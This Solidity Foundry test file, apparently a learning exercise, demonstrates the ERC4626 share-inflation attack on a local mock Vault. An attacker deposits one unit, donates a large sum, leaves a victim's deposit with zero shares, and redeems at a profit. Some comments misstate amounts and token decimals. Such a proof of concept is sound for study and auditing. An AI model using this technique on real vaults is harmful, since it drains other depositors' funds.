// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../../src/week2/Vault.sol";
import {MockDai} from "../../src/week2/MockDai.sol";

contract ERC4626Attack is Test {

    Vault private vault;
    MockDai private mockDai;

    address public admin = makeAddr("Admin");
    address public bob = makeAddr("Bob");
    address public alice = makeAddr("Alice");

    function setUp() public {
        mockDai = new MockDai("MockDai", "MDAI");
        vault = new Vault(mockDai, "Vault", "VLT");
        // Fund Alice and Bob with 1000_000_000 DAI
        mockDai.transfer(alice, 1_000_000_000 ether);
        mockDai.transfer(bob, 1_000_000_000 ether);
        // Approvals by bob and alice on Vault contract
        vm.prank(alice);
        mockDai.approve(address(vault), 1_000_000_000 ether);
        vm.prank(bob);
        mockDai.approve(address(vault), 1_000_000_000 ether);
    }

    // // For the case of DAI, the decimals is 18
    // function testAttackForDAI() public {
    //     // 1. Bob deposits 1000 DAI and gets issued 1000 shares of Vault tokens
    //     // 2. Alice tries depositing 100 DAI and should get issued 100 shares of Vault tokens
    //     // 3. Before Alice could deposit, Bob donates 1000_000 DAI to the Vault to reduce the share price resulting in Alice getting 0 shares
    //     vm.startPrank(bob);
    //     vault.deposit(1000 ether, bob); // Deposit of $1000 DAI by Bob
    //     mockDai.transfer(address(vault), 100_000_000 ether);
    //     vm.stopPrank();
    //     vm.prank(alice);
    //     vault.deposit(100_000, alice); // Max amount that Alice can deposit that will end up her losing all her shares
    //     uint256 noOfSharesReceived = vault.balanceOf(bob);
    //     vm.prank(bob);
    //     vault.redeem(noOfSharesReceived, bob, bob); // Bob redeems all his shares
    //     assertEq(vault.balanceOf(alice), 0);
    //     assertGt(mockDai.balanceOf(bob), 100_001_000 ether); // Bob gets more than his initial assets deposited
    // }

    // function testMaxDAIDepositForAlice() public {
    //     vm.startPrank(bob);
    //     vault.deposit(1000 ether, bob); // Deposit of $1000 DAI by Bob
    //     mockDai.transfer(address(vault), 100_000_000 ether);
    //     vm.stopPrank();
    //     vm.prank(alice);
    //     console.log("testMaxDAIDepositForAlice: ", vault.previewDeposit(.0000000000001 ether)); // If Alice deposits max 100_000 wei of DAI is when her shares will be 0
    //     assertEq(vault.previewDeposit(.0000000000001 ether), 0);
    // }

    // For the case of USDC, the decimals is 6
    function testAttackForUSDC() public {
        // 1. Bob deposits 1000 USDC and gets issued 1000 shares of Vault tokens
        // 2. Alice tries depositing 100 USDC and should get issued 100 shares of Vault tokens
        // 3. Before Alice could deposit, Bob donates 1000_000 USDC to the Vault to reduce the share price resulting in Alice getting 0 shares
        vm.startPrank(bob);
        vault.deposit(1, bob); // Deposit of 10^-6 USDC by Bob
        mockDai.transfer(address(vault), 1_000_000_000_000); // Bob would need to transfer 1m USDC to the Vault to reduce the share price
        vm.stopPrank();
        vm.prank(alice);
        vault.deposit(100_000_000_000, alice); // Max amount that Alice can deposit that will end up her losing all her shares (100k USDC)
        uint256 noOfSharesReceived = vault.balanceOf(bob); 
        vm.prank(bob);
        vault.redeem(noOfSharesReceived, bob, bob); // Bob redeems all his shares
        assertEq(vault.balanceOf(alice), 0);
        assertGt(mockDai.balanceOf(bob), 1_100_000_000_000); // Bob gets more than his initial assets deposited
    }

    // For the case of USDC, the decimals is 6
    function testMaxUSDCDepositForAlice() public {
        // 1. Bob deposits 100 USDC and gets issued 100 shares of Vault tokens
        // 2. Alice tries depositing 100 USDC and should get issued 100 shares of Vault tokens
        // 3. Before Alice could deposit, Bob donates 1000_000_000 USDC to the Vault to reduce the share price resulting in Alice getting 0 shares
        vm.startPrank(bob);
        vault.deposit(1, bob); // Deposit of 10^-6 USDC by Bob
        mockDai.transfer(address(vault), 1_000_000_000_000); // Bob would need to transfer $1m USDC to the Vault to reduce the share price
        vm.stopPrank();
        vm.prank(alice);
        console.log("testMaxUSDCDepositForAlice: ", vault.previewDeposit(100_000_000_000)); // If Alice deposits max this much amount is when her shares will be 0
        assertEq(vault.previewDeposit(100_000_000_000), 0);
    }
}